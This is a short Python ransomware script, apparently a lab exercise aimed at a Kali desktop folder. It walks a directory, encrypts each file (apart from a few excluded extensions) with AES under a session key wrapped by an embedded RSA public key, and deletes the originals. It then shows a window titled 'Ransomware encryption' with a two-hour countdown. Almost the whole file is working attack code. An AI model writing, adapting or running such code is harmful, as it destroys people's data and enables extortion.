import base64
import os
import tkinter
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP,AES

pubKey='''
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7/sLb5Z3DGQtHmQfsrd5
oFa0j7omGiF1Ce0xszJQJFZtXx4PbTSxlu8mL1m5COCUgtNrMLVR/nGwQN3UFqWN
A8qYv9vIVsAyXerAr61S0qQ+gZARPdUfNUIY4E1TWY5KAkNeEAJV+us7iISSyUWK
SI8dDU9++IaxxAQVTRbuq10bTccXL2N4aqAkodztHOLQTJCsNVPR6lOneqh+BkDq
oounm/hMBD7wiRvgewi1n7L6YKrnpBymJr4Tf8a1tonXdivfx+CvkUsU6I25kcUi
v93cqGsfnno0SWRp86eTzgLO4WRSAvyOtaKzgH+XkMbQtK/oHHIUxESiKLf5+/a7
twIDAQAB
'''
pubKey=base64.b64decode(pubKey)

#function for directory scan

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

#function for encryption

def encrypt(dataFile,pubkey):
    extension='.jpeg' #dataFile.suffix.lower()
    dataFile=str(dataFile)
    with open(dataFile,'rb') as f:
        data=f.read()
    
    data=bytes(data)
    
    #create public key object
    key=RSA.import_key(pubkey)
    sessionKey=os.urandom(16)
    
    #encrypt the sessionKEy
    cipher=PKCS1_OAEP.new(key)
    encryptedSessionKey=cipher.encrypt(sessionKey)
    
    #encrypt the data with sessionkey
    cipher= AES.new(sessionKey,AES.MODE_EAX)
    ciphertext,tag=cipher.encrypt_and_digest(data)
    
    #save the encrypted data to file 
    fileName = dataFile.split(extension)[0]
    fileExtension='.jerarice'
    encryptedfile=fileName+fileExtension
    
    with open(encryptedfile,'wb') as f:
        [f.write(x)  for x in(encryptedSessionKey,cipher.nonce,tag,ciphertext)]
    
    os.remove(dataFile)
    
#change the directory to the directory of the script 

directory='/home/kali/Desktop/'
excludeExtension=['.py','.pem','exe']        

for item in scanRecurse(directory)  :
    filePath=Path(item)
    fileType=filePath.suffix.lower()
    
    if fileType in excludeExtension:
        continue
    
    encrypt(filePath,pubKey)

def countdown(count):
    hour,minute,second=count.split(':')
    hour=int(hour)
    minute=int(minute)
    second=int(second)
    
    label['text']='{}:{}:{}'.format(hour,minute,second)
    
    if(second>0 or minute>0 or hour>0):
        if second>0:
            second-=1
        elif minute>0:
            minute-=1
        elif hour>0:
            hour-=1
            minute=59
            second=59
        root.after(1000,countdown,'{}:{}:{}'.format(hour,minute,second))

root=tkinter.Tk()
root.title('Ransomware encryption')  
label = tkinter.Label(root,font=('calibri',50,'bold'),fg='white',bg='red')
label.pack()
l = tkinter.Label(root, text = "File has been encrypted using ransomware, Encryption succesful")
l.config(font =("Courier", 14))
l.pack()
countdown('02:00:00')
root.mainloop()
